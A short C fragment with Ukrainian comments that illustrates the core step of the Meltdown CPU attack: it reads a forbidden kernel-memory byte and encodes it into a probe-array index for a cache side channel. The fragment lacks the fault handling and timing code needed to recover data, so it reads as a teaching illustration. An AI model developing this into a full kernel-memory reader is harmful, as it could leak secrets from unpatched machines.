/* kernel_address — заборонений покажчик на пам'ять ядра */
uint8_t probe_array[256 * 4096];

void trigger_meltdown(const uint8_t *kernel_address) {
    /* 1. Спроба прямого читання пам'яті ядра */
    uint8_t secret = *kernel_address; 

    /* 2. Транзитне мапування секрету в зміщення масиву-зонда */
    uint8_t dummy = probe_array[secret * 4096];
    (void)dummy;
}
